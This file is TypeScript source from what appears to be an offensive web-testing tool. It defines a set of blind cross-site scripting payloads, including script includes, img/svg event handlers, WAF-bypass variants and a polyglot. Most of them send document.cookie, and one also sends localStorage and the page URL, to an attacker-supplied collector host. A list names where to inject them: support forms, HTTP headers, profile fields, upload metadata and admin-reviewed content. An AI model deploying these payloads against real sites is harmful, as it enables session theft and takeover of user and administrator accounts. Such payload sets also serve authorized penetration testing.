export interface BlindXssPayload {
  id: string;
  label: string;
  build: (collector: string) => string;
}

export const BLIND_XSS_PAYLOADS: BlindXssPayload[] = [
  { id: 'script-src', label: 'Remote script include', build: (c) => `<script src="${c}"></script>` },
  { id: 'img-onerror', label: 'img onerror fetch', build: (c) => `<img src=x onerror="fetch('${c}?c='+document.cookie)">` },
  { id: 'svg-onload', label: 'svg onload fetch', build: (c) => `<svg onload="fetch('${c}?c='+document.cookie)">` },
  {
    id: 'fetch-full',
    label: 'Full context exfil (cookie, URL, localStorage)',
    build: (c) =>
      `<script>fetch('${c}',{method:'POST',body:JSON.stringify({url:location.href,cookie:document.cookie,ls:JSON.stringify(localStorage)})})</script>`,
  },
  {
    id: 'waf-mixedcase',
    label: 'WAF bypass: mixed case tag',
    build: (c) => `<ScRiPt SrC=${c}></sCrIpT>`,
  },
  {
    id: 'waf-nofilter-attr',
    label: 'WAF bypass: no-quote attribute',
    build: (c) => `<img src=x onerror=fetch(${c}+'?c='+document.cookie)>`,
  },
  {
    id: 'waf-svg-animate',
    label: 'WAF bypass: SVG animate event',
    build: (c) => `<svg><animate onbegin="fetch('${c}?c='+document.cookie)" attributeName=x dur=1s>`,
  },
  {
    id: 'waf-details',
    label: 'WAF bypass: details/ontoggle',
    build: (c) => `<details ontoggle="fetch('${c}?c='+document.cookie)" open>`,
  },
  {
    id: 'polyglot',
    label: 'Multi-context polyglot',
    build: (c) =>
      `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=(fetch('${c}?c='+document.cookie))//)//`,
  },
];

export const BLIND_XSS_LANDING_SPOTS = [
  'Contact / support / feedback forms',
  'User-Agent and Referer headers (via HeaderInject)',
  'Profile fields: display name, bio, signature',
  'File upload metadata: filename, EXIF fields',
  'Admin-reviewed content: comments, reviews, tickets, order notes',
  'Log viewers and admin dashboards that render raw request data',
];
